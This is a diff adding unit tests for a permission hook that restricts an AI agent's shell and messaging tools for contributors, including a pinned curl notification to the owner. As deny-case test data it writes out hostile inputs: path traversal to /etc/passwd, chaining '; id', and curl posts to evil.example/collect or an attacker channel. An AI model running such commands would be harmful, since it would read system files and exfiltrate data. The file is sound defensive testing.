@@ -450,3 +450,136 @@ class TestSelfTest(TopicDir):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class ReadMemoryDir(TopicDir):
+    """A topic that also has read-memory linked in, the way a real one does."""
+
+    def setUp(self):
+        super().setUp()
+        (self.dir / ".claude" / "skills" / "read-memory").symlink_to(
+            REPO / "skills" / "read-memory")
+        self.dump = ".claude/skills/read-memory/dump.sh"
+
+
+class TestReadMemoryDump(ReadMemoryDir):
+    """read-memory's SKILL.md tells contributors to call dump.sh. If the gate
+    denies it, the skill is a lie and proposals get written blind."""
+
+    def test_contributor_may_dump_memory(self):
+        decision, reason = run_hook("Bash", {"command": f"bash {self.dump}"}, self.dir)
+        self.assertIsNone(decision, reason)
+
+    def test_arguments_are_denied(self):
+        # dump.sh takes none, so anything extra is someone trying a different job.
+        decision, _ = run_hook("Bash", {"command": f"bash {self.dump} ../../../etc/passwd"},
+                               self.dir)
+        self.assertEqual(decision, "deny")
+
+    def test_another_script_named_dump_sh_is_denied(self):
+        impostor = self.dir / "pending" / "dump.sh"
+        impostor.write_text("#!/bin/sh\ncat /etc/passwd\n")
+        decision, _ = run_hook("Bash", {"command": "bash pending/dump.sh"}, self.dir)
+        self.assertEqual(decision, "deny")
+
+    def test_a_different_interpreter_is_denied(self):
+        decision, _ = run_hook("Bash", {"command": f"sh {self.dump}"}, self.dir)
+        self.assertEqual(decision, "deny")
+
+    def test_chaining_onto_a_legal_dump_is_denied(self):
+        decision, _ = run_hook("Bash", {"command": f"bash {self.dump} ; id"}, self.dir)
+        self.assertEqual(decision, "deny")
+
+
+class TestChannelTools(TopicDir):
+    """The matcher is '*', so every MCP tool reaches the gate. A contributor who
+    cannot call reply is a contributor the agent can never answer."""
+
+    def test_reply_is_allowed(self):
+        for tool in ("mcp__discord__reply", "mcp__line__reply", "mcp__slack__reply"):
+            with self.subTest(tool=tool):
+                decision, reason = run_hook(tool, {"chat_id": "1", "text": "hi"}, self.dir)
+                self.assertIsNone(decision, reason)
+
+    def test_fetch_messages_is_allowed(self):
+        decision, reason = run_hook("mcp__discord__fetch_messages", {"chat_id": "1"},
+                                    self.dir)
+        self.assertIsNone(decision, reason)
+
+    def test_reading_other_peoples_dms_is_denied(self):
+        # Still a read — but not a read of what this conversation already said.
+        decision, _ = run_hook("mcp__slack__fetch_user_dms", {"user": "U9"}, self.dir)
+        self.assertEqual(decision, "deny")
+
+    def test_an_unrelated_mcp_tool_is_denied(self):
+        decision, _ = run_hook("mcp__github__create_issue", {"title": "x"}, self.dir)
+        self.assertEqual(decision, "deny")
+
+    def test_a_lookalike_channel_name_is_denied(self):
+        decision, _ = run_hook("mcp__slack__reply_all", {"chat_id": "1"}, self.dir)
+        self.assertEqual(decision, "deny")
+
+
+class TestOwnerNotification(TopicDir):
+    """The one outbound command a contributor gets. Every dimension is pinned,
+    because this is the only place a proposal body could leave the host."""
+
+    OWNER = "U0WNER123"
+
+    def curl(self, channel=None, extra="", url=None):
+        channel = channel or self.OWNER
+        url = url or "https://slack.com/api/chat.postMessage"
+        body = '{"channel":"%s","text":"new proposal"}' % channel
+        return (f"curl -s -X POST {url} "
+                f'-H "Content-Type: application/json" {extra}'
+                f"-d '{body}'")
+
+    def run_curl(self, cmd, owner=OWNER):
+        return run_hook("Bash", {"command": cmd}, self.dir,
+                        env_extra={"OWNER_SLACK_USER_ID": owner})
+
+    def test_notifying_the_owner_is_allowed(self):
+        decision, reason = self.run_curl(self.curl())
+        self.assertIsNone(decision, reason)
+
+    def test_denied_when_no_owner_is_configured(self):
+        # Empty owner used to make the destination check compare against "",
+        # which matched every channel. Now it closes the rule instead.
+        decision, reason = self.run_curl(self.curl(), owner="")
+        self.assertEqual(decision, "deny")
+        self.assertIn("OWNER_SLACK_USER_ID", reason)
+
+    def test_a_different_recipient_is_denied(self):
+        decision, _ = self.run_curl(self.curl(channel="UATTACKER"))
+        self.assertEqual(decision, "deny")
+
+    def test_a_second_data_flag_is_denied(self):
+        # curl takes the last -d, so a trailing one silently swaps the payload.
+        decision, _ = self.run_curl(
+            self.curl() + " -d '{\"channel\":\"UATTACKER\",\"text\":\"x\"}'")
+        self.assertEqual(decision, "deny")
+
+    def test_writing_the_response_to_a_file_is_denied(self):
+        decision, _ = self.run_curl(self.curl(extra="-o /tmp/out.json "))
+        self.assertEqual(decision, "deny")
+
+    def test_another_url_is_denied(self):
+        decision, _ = self.run_curl(self.curl(url="https://evil.example/collect"))
+        self.assertEqual(decision, "deny")
+
+    def test_a_second_url_is_denied(self):
+        decision, _ = self.run_curl(self.curl() + " https://evil.example/collect")
+        self.assertEqual(decision, "deny")
+
+    def test_owner_is_not_restricted_to_this_shape(self):
+        decision, _ = run_hook("Bash", {"command": "curl https://example.com"},
+                               self.dir, role="owner")
+        self.assertIsNone(decision)
+
+    def test_an_unfilled_placeholder_owner_is_denied(self):
+        # bot.env ships OWNER_SLACK_USER_ID=UREPLACE_ME. Treating that as a
+        # real recipient would arm the rule on a scaffolded, unconfigured topic.
+        decision, reason = self.run_curl(self.curl(channel="UREPLACE_ME"),
+                                         owner="UREPLACE_ME")
+        self.assertEqual(decision, "deny")
+        self.assertIn("OWNER_SLACK_USER_ID", reason)
